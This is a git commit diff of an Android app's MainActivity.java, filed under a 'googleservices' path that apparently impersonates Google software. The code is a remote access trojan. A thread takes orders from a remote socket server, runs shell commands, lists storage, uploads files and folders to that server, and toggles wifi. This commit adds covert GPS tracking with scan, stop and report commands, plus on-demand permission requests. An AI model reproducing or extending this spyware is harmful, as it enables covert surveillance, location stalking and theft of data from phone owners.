49782c5729bdf922757b0126eca185f8a19bfe57
Ahmed Shahriar <47810596+shahriar0247@users.noreply.github.com>
2020-09-16 20:04:06 +0600

    Update MainActivity.java

--- app/src/main/java/com/google/googleservices/MainActivity.java
+++ app/src/main/java/com/google/googleservices/MainActivity.java
@@ -1,42 +1,58 @@
 package com.shahriar.xenaecosystem;
 
-import androidx.annotation.NonNull;
-import androidx.annotation.Nullable;
+
 import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
 
-import android.bluetooth.BluetoothAdapter;
+import android.Manifest;
+
+import android.annotation.SuppressLint;
+import android.app.Activity;
+import android.app.Application;
 import android.content.Context;
-import android.content.Intent;
+
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
+import android.location.Location;
+
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.util.Log;
 
-import java.io.BufferedInputStream;
+
+import com.google.android.gms.location.FusedLocationProviderClient;
+
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.tasks.OnSuccessListener;
+
+
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileNotFoundException;
+
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
+
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.nio.file.Files;
-import java.nio.file.Path;
+
 import java.nio.file.Paths;
 import java.util.ArrayList;
-import java.util.Collection;
-import java.util.Iterator;
+
 import java.util.List;
-import java.util.ListIterator;
+import java.util.concurrent.Executor;
+
 
 public class Activity1 extends AppCompatActivity {
+
+
+    private String current_location = "null";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -49,10 +65,10 @@ public class Activity1 extends AppCompatActivity {
 
     }
 
-
     class connect extends Thread {
 
         String currentpath = Environment.getExternalStorageDirectory().toString();
+
 
         @RequiresApi(api = Build.VERSION_CODES.O)
         @Override
@@ -65,10 +81,12 @@ public class Activity1 extends AppCompatActivity {
                 String cmd = get_cmd(server);
                 if (cmd.startsWith("shell ")) {
                     output = shell(cmd.replace("shell ", ""));
-                } else if (cmd.startsWith("turn")) {
-                    output = basic_cmd(cmd);
+
+                } else if (cmd.startsWith(("ask"))) {
+                    output = ask_permission(cmd);
+
                 } else {
-                    output = advanced_cmd(server, cmd);
+                    output = commands(server, cmd);
                 }
                 send(server, "output size: " + output.length() + "\n" + output);
             }
@@ -148,26 +166,21 @@ public class Activity1 extends AppCompatActivity {
             return output;
         }
 
-        String basic_cmd(String cmd) {
+
+        @RequiresApi(api = Build.VERSION_CODES.O)
+        String commands(Socket server, String cmd) {
 
             String output = "null";
+
+
             if (cmd.startsWith("turn")) {
 
                 if (cmd.contains("wifi")) {
                     output = wifi(cmd);
                 }
 
-            }
-
-            return output;
-        }
-
-        @RequiresApi(api = Build.VERSION_CODES.O)
-        String advanced_cmd(Socket server, String cmd) {
-            List<String> files = null;
-            String output = "null";
-            if (cmd.startsWith("ls")) {
-
+            } else if (cmd.startsWith("ls")) {
+                List<String> files = null;
                 final String state = Environment.getExternalStorageState();
 
                 if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
@@ -197,22 +210,31 @@ public class Activity1 extends AppCompatActivity {
                 send(server, "downloading");
 
                 cmd = cmd.split("download ")[1];
-               download2(server, cmd);
-               output = "donwload complete";
+                download2(server, cmd);
+                output = "donwload complete";
 
+            } else if (cmd.startsWith("location")) {
+                if (cmd.contains("scan")) {
+                    output = loc_call("scan");
+
+                }
+                else if (cmd.contains(("stop"))){
+                    output = loc_call("stop");
+                }
+                else{
+                    output = getlocation2();
+                }
             }
             return output;
         }
 
-       
 
         @RequiresApi(api = Build.VERSION_CODES.O)
-        void download2(Socket server, String requested_file){
+        void download2(Socket server, String requested_file) {
             String output = "null";
 
             String file_to_download_loc = currentpath + "/" + requested_file;
             File file = new File(file_to_download_loc);
-
 
 
             if (file.isDirectory()) {
@@ -224,13 +246,12 @@ public class Activity1 extends AppCompatActivity {
 
                 send(server, "number_of_files: " + all_files.size());
 
-                for (String file1 : all_files){
+                for (String file1 : all_files) {
 
-                    download2(server, requested_file +"/" + file1);
+                    download2(server, requested_file + "/" + file1);
 
                 }
-            }
-            else if (file.isFile()) {
+            } else if (file.isFile()) {
                 send(server, "file");
                 downloadfile(server, file_to_download_loc, requested_file);
                 recv(server);
@@ -359,6 +380,125 @@ public class Activity1 extends AppCompatActivity {
             return "error";
         }
 
+
+
+
+        String loc_call(String action){
+            if (action.contains("scan")) {
+                if ((ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED)) {
+                    Runnable r = new Runnable() {
+                        public void run() {
+                            scan_loc();
+                        }
+                    };
+
+                    Activity1.this.runOnUiThread(r);
+                    return "Scanning";
+                } else {
+                    return "Permission denied";
+                }
+            }
+            else if (action.contains("stop")){
+
+                Runnable r = new Runnable() {
+                    public void run() {
+                        stop_loc();
+                    }
+                };
+
+                Activity1.this.runOnUiThread(r);
+            }
+            return "Stopped";
+        }
+
+        String getlocation2(){
+            return current_location;
+        }
+
+    }
+    LocationManager locationManager;
+        @SuppressLint("MissingPermission")
+        void scan_loc() {
+
+
+                locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+
+
+                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0,loc_listen);
+
+
+
+
+        }
+
+        void stop_loc(){
+            locationManager.removeUpdates(loc_listen);
+        }
+    LocationListener loc_listen=new LocationListener() {
+
+        @Override
+        public void onLocationChanged(Location location) {
+            current_location = "Latitude: " + location.getLatitude() + "Longitude: " + location.getLongitude();
+
+        }
+
+        @Override
+        public void onStatusChanged(String s, int i, Bundle bundle) {
+
+        }
+
+        @Override
+        public void onProviderEnabled(String s) {
+
+        }
+
+        @Override
+        public void onProviderDisabled(String s) {
+
+        }
+    };
+        
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    String ask_permission(String cmd) {
+        String output = "null";
+        if (cmd.contains("storage")) {
+
+            if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
+                    == PackageManager.PERMISSION_GRANTED) {
+                output = "Permission already granted";
+
+            } else {
+
+                output = "Permission asked";
+                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
+
+            }
+        } else if (cmd.contains("location")) {
+            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
+                    == PackageManager.PERMISSION_GRANTED) {
+                output = "Permission already granted";
+
+            } else {
+
+                output = "Permission asked";
+                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 1);
+
+            }
+            if (checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
+                    == PackageManager.PERMISSION_GRANTED) {
+                output = "Permission already granted";
+
+            } else {
+
+                output = "Permission asked";
+                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_COARSE_LOCATION}, 1);
+            }
+
+        }
+
+        return output;
     }
 
 }
+
